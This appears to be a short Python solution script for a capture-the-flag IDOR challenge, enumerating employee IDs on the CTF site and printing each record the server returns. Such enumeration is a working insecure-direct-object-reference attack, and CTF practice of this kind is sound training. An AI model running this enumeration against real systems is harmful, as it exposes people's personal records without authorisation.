import requests

for i in range(1, 340):
    url = f'https://ctf2.savosec.fi/03-idor2/employees/{i}'
    response = requests.get(url)
    if response.status_code == 200:
        print(f'User ID {i} exists: {response.text}')